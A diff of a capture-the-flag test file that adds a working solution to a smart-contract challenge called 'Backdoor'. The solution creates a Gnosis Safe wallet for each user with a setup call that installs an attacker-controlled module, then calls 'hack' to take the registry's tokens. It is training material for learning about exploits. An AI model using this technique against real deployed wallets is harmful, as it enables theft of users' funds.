@@ -46,14 +46,56 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        console.log({ masterCopy: masterCopy.address })
-        const contractFactory = await ethers.getContractFactory('BackdoorAttacker', player);
-        const contract = await contractFactory.deploy(masterCopy.address, walletFactory.address, walletRegistry.address, users, { gasLimit: 10000000 });
-        const receipt = await contract.deployTransaction.wait();
 
-        for (const ev of receipt.events) {
-            console.log('event', ev.event, ev.args)
+        const fakeGnosis = await (await ethers.getContractFactory('FakeGnosis')).deploy();
+        const backdoorModule = await (await ethers.getContractFactory('BackdoorModule')).deploy();
+
+        console.log({ fakeGnosis: fakeGnosis.address })
+        console.log({ masterCopy: masterCopy.address })
+
+        const userwallets = []
+
+        for (const user of users) {
+            const moduleInitializer = fakeGnosis.interface.encodeFunctionData("hack", [backdoorModule.address]);
+
+            /**
+ *         address[] calldata _owners,
+uint256 _threshold,
+address to,
+bytes calldata data,
+address fallbackHandler,
+address paymentToken,
+uint256 payment,
+address payable paymentReceiver
+ */
+            const setupInitializer = masterCopy.interface.encodeFunctionData("setup", [
+                [user],
+                1,
+                fakeGnosis.address,
+                moduleInitializer,
+                ethers.constants.AddressZero,
+                ethers.constants.AddressZero,
+                0,
+                ethers.constants.AddressZero
+            ]);
+
+            /**
+             *         address _singleton,
+        bytes memory initializer,
+        uint256 saltNonce,
+        IProxyCreationCallback callback
+                */
+            await walletFactory.createProxyWithCallback(
+                masterCopy.address,
+                setupInitializer,
+                0,
+                walletRegistry.address
+            );
+
+            userwallets.push(await walletRegistry.wallets(user))
         }
+
+        await backdoorModule.connect(player).hack(token.address, userwallets);
     });
 
     after(async function () {
